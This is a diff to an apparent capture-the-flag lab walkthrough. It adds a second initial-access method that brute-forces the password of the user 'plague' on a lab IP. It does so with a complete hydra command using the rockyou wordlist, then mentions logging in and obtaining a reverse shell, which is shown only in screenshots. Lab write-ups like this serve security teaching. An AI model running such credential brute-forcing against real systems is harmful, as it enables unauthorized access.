@@ -129,6 +129,16 @@ You can now ssh using the passphrase....
  <br>
 
  ![Screenshot_2022-11-27_20_31_06](https://user-images.githubusercontent.com/99975622/207658953-24ac6bad-d182-4368-9f79-4686c523cf4e.png)
+ 
+ ## Method 2 Initial Access...
+ You can also brute force the password for the backdoor using hydra and the user 'plague'
+ ```
+hydra -l plague -P /usr/share/wordlists/rockyou.txt 10.10.239.127 http-post-form "/api/login:username=^USER^&password=^PASS^:F=Incorrect credentials"
+ ```
+ ![Screenshot_2023-01-03_22_35_45](https://user-images.githubusercontent.com/99975622/210453250-0c84d3f6-6f69-4b19-b784-803a085ac311.png)
+And you can then login as plague then get a reverse shell...
+ ![Screenshot_2023-01-03_22_41_31](https://user-images.githubusercontent.com/99975622/210453341-dd3a51e7-9954-4af6-804d-5bc02013cf75.png)
+
 Its up to you now to protect your throne!
 <br>
 ;)
